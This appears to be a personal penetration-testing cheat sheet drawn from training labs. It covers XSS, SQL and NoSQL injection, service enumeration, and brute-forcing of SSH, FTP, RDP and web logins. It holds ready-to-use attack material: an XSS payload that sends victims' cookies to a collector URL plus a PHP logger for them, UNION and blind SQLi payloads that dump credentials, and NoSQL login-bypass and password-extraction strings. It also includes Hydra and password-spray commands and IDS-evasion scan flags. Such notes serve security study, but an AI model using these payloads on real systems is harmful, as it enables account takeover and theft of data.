>[!tldr]
># **reverse shell stabilization** during penetration testing
># `python3 -c "import pty;pty.spawn('/bin/bash')"`
># **Stabilize a Shell**:
># `export TERM=xterm`
# 1. Injection

## 1. [Cross-site scripting](#XSS)
## 2. [SQL injection](#sqL)

# 2.Ports
## 1. [SAMBA]( #SAMBA)
## 2. [FTP](#FTP)

## 3.[SSH](#SSH)

## 4.[Telnet](#Telnet)

## 5.[SMPT](#SMPT)
## 5.[RDP](#RDP)

## 6.[SQL](#mysql)

## 7.[DNS](#DNS)
# 3.Scanning
## 1.[Nmap](#Nmap)

## 2.[MassScan](#MassScan)
# 4. Enumeration

## 1.Directory
### 1.[Dirhunt](#Dirhunt)
### 2.[Gobuster](#Gobuster)
### 3.[FFUF](#FFUF)
## 2.Subdomain

### 1.[Gobuster](#Gobuster)

### 2.[Amass](#Amass)

### 3.[Subdomainizer](#Subdomainizer)

### 4.[FFUF](#FFUF)
## 3.Vulnerability
### 1. [Nikto](#Nikto)
# 5.Brute-Force

## 1.[Ffuf](#Ffuf)

## 2.[Gobuster](#Gobuster)

## 3.[Hydra](#Hydra)

## 4. [WFUZZ](#WFUZZ)

# 6.Exploitation
### 1.[joomla](#joomscan)

### 2.[Wpscan](#Wpscan)

# 7.Other
## 1.[API](#API)

-------------------------------------------------------------------------------------------------------------------------------------------------------------------


------------------------------------------------------------------------------------------------------------------------------------------










# ====================================================================================================================================================================

# XSS
## Stored XSS

## DOM XSS

## Blind XSS

## Reflicted XSS
### Take the Cookie:  `<script>alert(document.cookie)</script>`

### Take the Cookie Silence: `<script> var o = new Image(); o.src="http://127.0.0.1/?cookie="+document.cookie </script> 

```php
<?php

$cookie = $_GET['cookie'];

$ip = $_SERVER['REMOTE_ADDR'];
$browser = $_Server['HTTP_USER_AGENT'];

$ftp = fopen('log.txt','a');

fwrite($fp,'ip: '.$ip."\n".'cookie: '.$cookie."\n".'browser: '.$browser."\n-----------------------------------------\n");

fclose($fp);
?>

```
### Take the Cookie and save it in log.txt: `<script> var o = new Image(); o.src="http://127.0.0.1/get.php?cookie="+document.cookie </script> 

## Self XSS

>[!tip]
># Some test
>JS : `<script>alert("XSS")</script>`
>HTML : `<body onload=alert("XSS")>`
>IMG : `<img src='x' onerror=alert(1);>`
>AUDIO :  `<audio src=a pnerror=alert(XSS)>`

# Sql

![[Screenshot From 2024-12-19 23-51-09.png]]


## Some test to find SQL injection 
>[!tip]
>`username' OR '1`
>`UNION SELECT NULL;--`
>`username'UNION SELECT 1, GROUP_CONTACT(0x7c,schema_name 0x7c) FROM information_schema.schemata`
>`username'Union Select sqlite_version()''` ==> version exp "3.2.5" 

>[!important]
># username'UNION SELECT sql FROM sqlite_Master


## SQL MAP
>[!note]
># download SQL MAP
>[https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)

### Basic commands

| **Options**       | **Description**                                       |
| ----------------- | ----------------------------------------------------- |
| -u URL, --url=URL | Target URL (e.g. "http://www.site.com/vuln.php?id=1") |
| --data=DATA       | Data string to be sent through POST (e.g. "id=1")     |
| -p TESTPARAMETER  | Testable parameter(s)                                 |
| --level=LEVEL     | Level of tests to perform (1-5, default 1)            |
| --risk=RISK       | Risk of tests to perform (1-3, default 1)             |
| --banner          | check in every database                               |
### Enumeration commands

| Options              | Description                                    |
| -------------------- | ---------------------------------------------- |
| -a, --all            | Retrieve everything                            |
| -b, --banner         | Retrieve DBMS banner                           |
| --current-user       | Retrieve DBMS current user                     |
| --current-db         | Retrieve DBMS current database                 |
| --passwords          | Enumerate DBMS users password hashes           |
| ==--dbs==            | ==Enumerate DBMS databases==                   |
| ==--tables==         | ==Enumerate DBMS database tables==             |
| ==--columns==        | ==Enumerate DBMS database table columns==      |
| --schema             | Enumerate DBMS schema                          |
| ==--dump==           | ==Dump DBMS database table entries==           |
| --dump-all           | Dump all DBMS databases tables entries         |
| ==-D `<DB NAME>`==   | ==DBMS database to enumerate==                 |
| ==-T `<Table Name`== | ==DBMS database table(s) to enumerate==        |
| ==-C COL==           | ==DBMS database table column(s) to enumerate== |
>[!tip]
>--banner ==> check in every database
>--batch ==> Default answer
>--random-agent ==> covering your trace & pass the firewall & Use randomly selected HTTP User-Agent header value
>--dbms (type of data base)
>--tables ==> tables names
>--columns ==> coulmns names



## I-SQL Injection
A-
	1-scenario
		`https://website.thm/blog?id=1` <== id=1, each blog entry has a unique ID number
			sql>`SELECT * from blog where id=1 and private=0 LIMIT 1;`
	2-scenario
		`https://website.thm/blog?id=2;--` <== article ID 2 is still locked as private, so it cannot be viewed on the website.
			sql>`SELECT * from blog where id=2;-- and private=0 LIMIT 1;`
				or
			sql>`SELECT * from blog where id=2;--`
B- In-Band SQLi
	1-we need to do is return data to the browser without displaying an error message
		`https://website.thm/article?id=0 UNION SELECT 1`
	2-we'll get the database name that we have access to
		`https://website.thm/article?id=0 UNION SELECT 1,database()`
	3-Our next query will gather a list of tables that are in this database.
		`https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = '$database_name'`
	4-We can utilise the information_schema database again to find the structure of this table using the below query.
		`https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = '$Table_name'`
	5-We can use the username and password columns for our following query to retrieve the user's information.
		`https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM $table_name`
C-Blind SQLi
	1-Authentication Bypass
		`' OR 1=1;--`
	2-Boolean Based -brutforce-
		a-you'll receive a **true** response that confirms the database name begins,then you move on to the next character of the database name until you find another true response
			`admin123' UNION SELECT 1,2,3 where database() like '$brutforce%';--`
		b-You'll finally end up discovering a table in the sqli_three database named users, which you can confirm by running the following username payload
			`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = '$table_name' and table_name like '$brutforce%';--`
		c-we search the **columns** table where the database_name, the table_name, and the column name and you need to start to brutforce again
			`admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = '$database_name' and table_name='$table_name' and COLUMN_NAME like '$brutforce%';
		d-First, you'll need to discover a valid username, which you can use the payload below
			`admin123' UNION SELECT 1,2,3 from $table_name where username like '$brutforce%`
		f-Now you've got the username.You can concentrate on discovering the password. The payload below shows you how to find the password
			`admin123' UNION SELECT 1,2,3 from $table_name where username='admin' and password like '$brutforce%`
	3-Time-Based
		-The same principe of "Boolean Based -brutforce-"
		"https://website.thm/analytics?referrer='admin123' UNION SELECT SLEEP($set_time_to_response),2 from $Table_name where $column_name='admin' and password like '$brutforce%
## II-NO SQL Injection
### Objectives
- Understand what NoSQL is
- Understand how NoSQL databases work, store data, and are interfaced with
- Learn about the different types of NoSQL injection attacks
- Learn how to practically exploit a NoSQL injection vulnerability
### MongoDB
 -You would then create a document for each employee containing the data in a format that looks like this:
 ###  {"_id" : ObjectId("5f077332de2cdf808d26cd74"), "username" : "lphillips", "first_name" : "Logan", "last_name" : "Phillips", "age" : "65", "email" : "lphillips@example.com" }
 
### Querying the Database
If we wanted to build a filter so that only the documents where the last_name is "Sandler" are retrieved, our filter would look like this:
`**['last_name' => 'Sandler']**`
If we wanted to filter the documents where the gender is male, and the last_name is Phillips, we would have the following filter:
`**['gender' => 'male', 'last_name' => 'Phillips']**`
If we wanted to retrieve all documents where the age is less than 50, we could use the following filter:
`**['age' => ['$lt'=>'50']]**`
 
>[!tip]
># Query and Projection Operators
>https://www.mongodb.com/docs/manual/reference/operator/query/

#### you can use $ne = not equal 
`user[$ne]=test&pass[$ne]=test&remember=on` ==> you need to put it in intercept sections and the forward it
#### Notice that the $nin operator receives a list of values to ignore.

> [!NOTE]
> - ['username'=>['$nin'=>['admin'] ], 'password'=>['$ne'=>'aweasdf']]
### Extracting Users' Passwords
| name                                                                                                       | Description                                                          |
| ---------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------- |
| [`$regex`](https://www.mongodb.com/docs/manual/reference/operator/query/regex/#mongodb-query-op.-regex)    | Selects documents where values match a specified regular expression. |
| [`$exists`](https://www.mongodb.com/docs/manual/reference/operator/query/exists/#mongodb-query-op.-exists) | Matches documents that have the specified field.                     |
| [`$nin`](https://www.mongodb.com/docs/manual/reference/operator/query/nin/#mongodb-query-op.-nin)          | Matches none of the values specified in an array.                    |
#### user=admin&pass[$regrex]=^.{length of password (bruteforce it)}$&remember=on | exemple length =5 ==> ==it depend on the response location==
#### user=admin&pass[$regrex]=^(bruteforce)....$&remember=on ==> bruteforce every letter 

## III. advance SQL Injection
### Objectif:
#### - Second-order SQL injection   
#### - Filter evasion
#### - Out-of-band SQL Injection
#### - Automation techniques
#### - Mitigation measures

### Impact:
Since the payload does not cause disruption during the first step, it can be overlooked until it's too late, making the attack particularly stealthy.

### Second-Order
>[!note]
># real_escape_string(): 
>this method can mitigate some risks of immediate SQL Injection by escaping single quotes and other SQL meta-characters, it does not secure the application against Second Order SQLi.
># Intro to PHP'; DROP TABLE books;--
>might not affect the **INSERT** operation but could have serious implications if the book name is later used in another SQL context without proper handling.


# SAMBA
## 1-nmap we can enumerate a machine for SMB shares.
````
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP`
````
## 2- Find Files
````
smbclient //<ip>/anonymous 
````
## 3-connect to smbclient.
````
smbclient -U USER '//[IP]/[SHARE]'  
````
## 3-download the SMB share
````
smbget -R smb://<ip>/anonymous
````

# FTP 

## FTP
### Find FTP Port

```
nmap -sV -SC IP -p20,21
```

### Attack

### Brute Force

```
hydra -t X -l USERNAME -P WORDLIST -vV IP ftp
```

### Connection

```
ftp [options] [IP]
```
## Proftpd
### 1-The mod_copy module implements **SITE CPFR** and **SITE CPTO** commands

![[Pasted image 20241223210604.png]]

We knew that the /var directory was a mount we could see. So we've now moved Kenobi's private key to the /var/tmp directory.

Lets mount the /var/tmp directory to our machine
```
mkdir /mnt/kenobiNFS  
mount machine_ip:/var /mnt/kenobiNFS  
ls -la /mnt/kenobiNFS
```

![[Pasted image 20241223210740.png]]

We now have a network mount on our deployed machine! We can go to /var/tmp and get the private key then login to Kenobi's account.

![[Pasted image 20241223210800.png]]

# SSH

## Find SSH Port

```
nmap -sV -SC IP -p22
```

## Attack

```
hydra -t X -l USERNAME -P WORDLIST -vV IP ssh
```

## Connection

### Linux Connection

```
ssh USER@IP
ssh -i id_rsa USER@IP
```

- id_rsa ---> Private
- id_rsa.pub ---> Public (Contain Username)

### Active Directory Connection
```
- Remmina (tool)

or

- ssh AD-DOMAIN\\<AD Username>@URL/IP/AD-ADDRESS        ---> From Linux terminal
```


# Telnet

## Find Telnet Port

```
nmap -sV -SC IP -p23
```

## Connection

```
telnet [ip] [port]
```

- IP ---> Target IP
- PORT ---> Port we want to interact with (example -> 110)

>[!tip]
># Exploit CVE
>- [https://www.cvedetails.com/ (opens in a new tab)](https://www.cvedetails.com/)
>- [https://cve.mitre.org/](https://cve.mitre.org/)

# SMPT

![[Pasted image 20241223213234.png]]

## Find SMTP Port

```
nmap -sV -SC IP -p25,587
```

## Attack

- Metasploit (BEST)

```
- msfconsole module ---> smtp_version
- msfconsole module ---> smtp_enum
```

- Enumeration

```
smtp-user-enum --help
smtp-user-enum -U /usr/share/wordlists/metasploit/unix_users.txt mail.example.tld 25
```

- smtp-user-enum       --->  Runs the tool
- -U          --->  Users List
- mail.example.tld ---> SMTP Mail to attack
- 25 ---> Port

## Connection

```
telnet [ip] 25
```

# RDP

## Find RDP ports

```
nmap -sV -sC IP -p3026,3389
```

## Attack

- Brute Force ([https://github.com/xFreed0m/RDPassSpray (opens in a new tab)](https://github.com/xFreed0m/RDPassSpray))

```
python3 RDPassSpray.py -h

python3 RDPassSpray.py -U USERNAMES.txt -p Spring2021! -t IP:PORT

python3 RDPassSpray.py -U USERNAMES.txt -p Spring2021! -d DOMAIN -T RDP_servers.txt
```

- -U ---> Username List
- -p ---> Single Password
- -d ---> Windows Domain
- -t ---> Targets (List of IP's)

## Connection
```
- Remmina (tool)

or

- xfreerdp /v:<server_address> /u:<username> /p:<password>        ---> From Linux terminal
```


# mysql
## Find MySQL Port

```
nmap -sV -sC IP -p3306
```

## Attack

````
- 4 Possible ways to get in MYSQL databse
```Terminal
1. MySQL server credentials                     ---> Brute Froce
2. The version of MySQL running                 ---> Via Nmap Scan
3. The number of Databases, and their names.    ---> Nmap & MSFconsole

4. Post exploitation    ---> Finding Creds in machine (Ex: Server running Wordpress)
````

- Brute Force

```
hydra -t X –l USERNAME –P WORDLIST IP -vV mysql
```

- hydra    --->  Runs the hydra tool
    
- -t X         --->  Number of parallel connections per target
    
- -l ---> Points to the user who's account you're trying to compromise
    
- -P ---> Points to the file containing the list of possible passwords
    
- -vV          ---> Sets verbose mode to very verbose, shows login + password
    
- IP        ---> The IP address of the target machine
    
- mysql --->  Sets the protocol
    
- Metasploit
    

```
- msfconsole ---> mysql_schemadump
- msfconsole ---> mysql_hashdump
```

## Connection

```
mysql -u USER -p PASSWORD -h IP
```

# DNS

## Find DNS Port

```
nmap -sV -SC IP -p53
```

## Connection

- Telnet

```
telnet [ip] 53
```

- Using Nslookup or Dig

```
dig www.example.com A
nslookup www.example.com A
...
```

- A ---> A record (DNS query we want information on)

## Attack

1. Perform DNS spoofing attacks: ---> Redirect users to fake websites or intercept sensitive data being transmitted over the network.
    
2. Conduct DNS amplification attacks ---> (DoS) attack.
    
3. Enumerate domain names ---> DNS zone transfers (List of all the domain names registered on a particular DNS server)


### Check Zone Info

- Searching trought the DNS using DIG

```
dig www.example.com A
dig www.example.com CNAME
```

### DNS Zone Transfer

```
dig @[DNS server IP] [zone] axfr
dig axfr [domain] @[DNS server]

host -t ns [domain]
host -l [domain] @[DNS server]
```

Replace `[DNS server IP]` with the IP address of the DNS server and `[zone]` with the name of the zone you want to transfer.

Replace `[domain]` with the domain for which you want to perform the zone transfer, and `[DNS server]` with the IP address or hostname of the DNS server that you want to query.

# nmap

## Common Use and Commands

Nmap is commonly used by security professionals, system administrators, and penetration testers to scan networks and identify potential vulnerabilities and security issues.

The following are some common commands used in Nmap:

Usual Commands

```
#First Scan       ---> Ping Scan
nmap -sn -ip

#Second Scan (Normal)         ---> Nmap Script, Version, Scanning, Traceroute
nmap -sC -sV -A IP -p (PORT FOUND) --min-rate=9856

#Second Scan (Hidding)
nmap -sC -sV -A -f IP -p (PORT FOUND) --min-rate=9856 --data-length 25
```

Additional Commands

```
-sT                         ---> TCP
-sU                         ---> UDP

-sC                         ---> Scan Script (Run default script)
-sV                         ---> Find port version
-sS                         ---> TCP SYN scan
-sA                         ---> Check Firewall filter
-sI                         ---> Use Zombie (Use other IP then your's to conduct the scan)

-iL                         ---> Scan from list.txt IP
-O                          ---> OS Dectection
-A                          ---> Enable OS detection, version detection... (All in one)
-D RND:NUMBER               ---> Create X diff IP adresse that will scan (ex: 10 different host)

-sn                         ---> Ping Sweep (Great for host dicovery(!= Scan ports))
-Pn                         ---> Dont ping

-f                          ---> Fragment parkets (Try to be undetectable)
--min-rate=9856             ---> Send packets at the rate of 9956 per second
--data-length 25            ---> add garbage data to packets (Avoid IPS/IDS signature)
--spoof-mac                 ---> Try to spoof address (Work localy)
--source-port X             ---> Change the source port for scanning (spoof source port)

-oN, -oG, -oX               ---> Export Format
```

- Options
    - Timing ---> T0-T5 (0=Paranoid and 5=Insane Fast)
    - Parelel ---> Use --source-port 80 (Will act like http request)
    - Random Scanning ---> Use nmap IP/24 --randomize-hosts
    - MAC Adress Spoofing ---> Nmap IP --spoof-mac (X)
    - Send Bad Checksums ---> Nmap IP --badsum

Nmap supports various options and flags that can be used to customize the scan and generate detailed reports, such as setting the output format, enabling verbose logging, and excluding certain hosts or ports.

# MassScan

### Common Use and Commands

MassScan is typically used by security professionals, researchers, and network administrators for large-scale network scanning tasks. Below are some common commands and options used in MassScan:

```
masscan -p1-65535 10.0.0.0/8 --rate 1000000
```

- `-p`: Specify ports to scan (e.g., `1-65535` for all ports).
- IP range: Define the IP range to scan (e.g., `10.0.0.0/8` for the entire Class A range).
- `--rate`: Set the scan rate, specifying the number of packets per second.

Additional options include:

```
--exclude           ---> Exclude specified IP ranges from the scan.
--adapter-ip        ---> Specify the adapter IP address.
--adapter-mac       ---> Specify the adapter MAC address.
--echo             ---> Print scan packets to stdout.
--router-mac        ---> Specify the router MAC address.
--router-ip         ---> Specify the router IP address.
--wait             ---> Set the wait time for each probe in milliseconds.
```

These options allow for further customization of the scan parameters, such as excluding specific IP ranges, specifying adapter details, echoing scan packets, and configuring router information.


# Dirhunt

```
dirhunt http://website.com/
```

# Gobuster

Scan for directories:

```
gobuster dir -u <url> -w <wordlist>

gobuster dir -u <url> -w <wordlist> -x "html,txt,php,zip,..." -t 25 --timeout Xs  --exclude-length X
```

- -u ---> URL
- -w ---> Wordlist
- -x ---> Append at the end of the directory
- -t ---> treats
- --timeout ---> Add some time between respond
- --exclude-lenght ---> Exclude result that has X bytes of data

Scan for subdomains:

```
gobuster dns -d <domain> -w <wordlist>
```

Gobuster supports multiple options and flags to customize the scan, such as setting the user-agent, specifying the proxy, setting the timeout and enabling recursion.
# FFUF

## Common uses and commands

FFUF can be used for various purposes such as directory and file discovery, virtual host discovery, parameter brute-forcing, and many more. Some of the common commands that can be used with FFUF include:

Website Enumeration

```
ffuf -u WEBISTE/FUZZ -w WORDLIST -fs NUMBER -fc STATUS -t NUMBER_TREATH
```

- -u ---> Website (Include the FUZZ word were you want to Fuzz)
- -w ---> Wordlist to be select
- -fs ---> Default response number (bytes) to ignore
- -fc ---> Response status to ignore (example 404,402, ...)

### Scan for Directories with ffuf

```
ffuf -u <url>/FUZZ -w <wordlist> -e html,txt,php,zip -t 25 -timeout Xs -fs X
```
### Explanation of Flags:

- `-u <url>/FUZZ`: Specifies the target URL, where `FUZZ` is the placeholder for directory names being tested.
- `-w <wordlist>`: The wordlist to use for brute-forcing directories.
- `-e html,txt,php,zip`: Appends extensions to the directory names.
- `-t 25`: Number of threads for concurrent requests.
- `-timeout Xs`: Timeout duration for requests.
- `-fs X`: Exclude results with a specific response size in bytes.

### Scan for Subdomains with ffuf

```
ffuf -u http://FUZZ.<domain> -w <wordlist> -t 25 -timeout Xs
```

### Explanation of Flags:

- `-u http://FUZZ.<domain>`: Specifies the domain to test, where `FUZZ` is the placeholder for subdomains.
- `-w <wordlist>`: The wordlist to use for brute-forcing subdomains.
- `-t 25`: Number of threads for concurrent requests.
- `-timeout Xs`: Timeout duration for requests.

### Fuzz Extensions with ffuf

```
ffuf -u <url>/file.FUZZ -w <wordlist> -t 25 -timeout Xs
```

#### Example

If you want to find files like `file.html`, `file.php`, `file.zip`, etc., you can use a wordlist containing the extensions (`html`, `php`, `zip`, etc.).

### Combined Directory and Extension Fuzzing

```
ffuf -u <url>/FUZZ.FUZZ -w <wordlist_directories>:W1 -w <wordlist_extensions>:W2 -t 25 -timeout Xs
```

#### Explanation

- `<url>/FUZZ.FUZZ`: First `FUZZ` is for directory names or file prefixes, and the second is for extensions.
- `-w <wordlist_directories>:W1`: Specifies the wordlist for directory or file prefixes.
- `-w <wordlist_extensions>:W2`: Specifies the wordlist for extensions.
- `-t 25`: Number of threads for concurrent requests.
- `-timeout Xs`: Timeout duration for requests.

#### Example Wordlists

- Wordlist for directory or file names: `admin`, `login`, `index`, etc.
- Wordlist for extensions: `html`, `php`, `txt`, etc.

This will allow **ffuf** to test combinations like:

- `/admin.html`
- `/login.php`
- `/index.txt`
### Additional Customization Options in ffuf

- `-H "User-Agent: custom-agent"`: Set a custom user-agent for the scan.
- `-x http://proxy:port`: Use a proxy during the scan.
- `-recursion`: Enable recursive scans in directories or subdomains.
- `-r`: Follows redirects automatically.
# Amass

## Common Use and Commands

Amass is commonly used by security professionals, bug bounty hunters, and penetration testers to gather information about their target organization and identify potential attack vectors.

The following are some common commands used in Amass:

## Subdomain Enumeration:

- Perform a DNS enumeration: `amass enum -d <domain>`
- To use passive DNS enumeration: `amass enum --passive -d <domain>`
- To use active DNS enumeration: `amass enum --active -d <domain>`
- To perform subdomain bruteforcing: `amass enum -d <domain> -brute`

## Directory Enumeration:

- To brute-force directories and files: `amass enum -active -d <domain> -w <wordlist>`
- To brute-force directories with a defined extension: `amass enum -active -d <domain> -w <wordlist> -dirsearch /path/to/extensions`
- To find URLs with HTTP response code 200: `amass enum -active -d <domain> -w <wordlist> -status-code 200`

## API Discovery:

- To discover APIs using passive techniques: `amass intel -d <domain> -api`
- To discover APIs using active techniques: `amass intel -d <domain> -api -active`
- To use a custom API key for Shodan: `amass intel -d <domain> -shodan-apikey <API-key>`

Amass supports various options and flags to customize the scan, such as setting the output format, configuring rate limits, and enabling verbose logging.

# Subdomainizer

### Common Use and Commands

Subdomainizer is commonly used to perform subdomain enumeration and reconnaissance. Below are some common commands and options used in Subdomainizer:

```
subdomainizer -d example.com -o output.txt
```

- `-d`: Specify the target domain to enumerate subdomains for (e.g., `example.com`).
- `-o`: Specify the output file to save the results (e.g., `output.txt`).


# Nikto
# Hydra

### Common uses and commands

Hydra can be used for various purposes such as password brute-forcing, account takeover, and network authentication testing. Some of the common commands that can be used with Hydra include:

Website

```
hydra -l USERNAME -P PASSWORD.txt IP http-POST|GET-form "/PATH-URL/something.php:username=^USER^&password=^PASS^:INVALID-STATEMENT-HTML" -VV -T X


hydra -l phillips -P /home/ubuntu/Downloads/list.txt 10.10.206.120 http-get-form "/login-get  
/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
```

- http-post-form = Request ---> CHANGE POST OR GET
- PATH = URL Path (From Website or BurpSuite)
- ^USER^ = Keyword to define the FUZZ of username
- ^PASS^ = Keyword to define the FUZZ of password.txt
- -t = Speed
- -VV = Verbose Enable
- Login trigger
    - S= ---> Element on the other page (After login)
    - HTML ---> HTML login fail element
- Tips
    - If there is no ?something= ---> Simply add : after the URL (/account-login.php:BURP-STUFF-HERE)

SSH

```
hydra -l USERNAME -P WORDLIST.txt MACHINE_IP -t X ssh
hydra -L USERNAME.txt -P PASSWORD MACHINE_IP -t X ssh
```

- ssh = Service

FTP

```
hydra -l user -P passlist.txt ftp://MACHINE_IP
```

- ftp:// = FTP server

SMTP

```
hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v
```

# WFUZZ

## Common uses and commands

Wfuzz can be used for various purposes such as directory and file discovery, parameter brute-forcing, and vulnerability discovery. Some of the common commands that can be used with Wfuzz include:

Website Login

```
wfuzz -zfile,wordlists/passwords.txt --hs 'Invalid-HTML-STATMENT' -d 'username=access&password=FUZZ' https://DOMAIN/login
```



# joomscan

## Common Use and Commands

###  ``` perl joomscan.pl -u IP ``` 

### . -u ---> URL (IP)

# Wpscan

## Common Use and Commands

### `wpscan --url URL --enumerate u`
## brutforce 

### `wpscan --url http://test.local/ --passwords passwords.txt`




# API

## Discovering API documentation

>[!exemple]
> # Look for endpoints that may refer to API documentation
>- `/api`
>- `/swagger/index.html`
>- `/openapi.json`

## Identifying API endpoints

### The HTTP method specifies the action to be performed on a resource.

>[!exemple]
># The HTTP method specifies the action to be performed on a resource
>- `GET` - Retrieves data from a resource.
>- `PATCH` - Applies partial changes to a resource.
>- `OPTIONS` - Retrieves information on the types of request methods that can be used on a resource.
># The endpoint `/api/tasks` may support the following methods
>- `GET /api/tasks` - Retrieves a list of tasks.
>- `POST /api/tasks` - Creates a new task.
>- `DELETE /api/tasks/1` - Deletes a task.

## Exploiting server-side parameter pollution in a query string

>[!tip]
># URL encode exemple:
>`% => %26`
>`# => %23`
>`+ => %2B`
>`= => %3D`
>`$ => %24` 

### Steps
- review the `/static/js/forgotPassword.js` JavaScript file
- change the value of the ==`field`== parameter from `email` to `reset_token`
-  In Burp's browser, enter the password reset endpoint in the address bar. Add your password reset token as the value of the `reset_token` parameter . For example:
	`/forgot-password?reset_token=123456789`

### Fuzzing parmeter

`ffuf -w /usr/share/seclists/Discovery/Web-content/burp-parameter-name.txt -X POST -u https://0a4d00c604f23c0a83e6794a004900e2.web-security-academy.net/forgot-password -b 'session=iXZ2y2ve1agcLzxVdjA3PjvtGRnbLdo9' -d 'csrf=hcgQ87vYnERpZ50LQITtB92RQNP7U1SK&username=administrator%26FUZZ=test' -mc all -x http://127.0.0.1:8080 -fs 40 -t 100`




# create wordliste
	crunch 3 3 -o file.txt -t %%% -s 100 -e 200

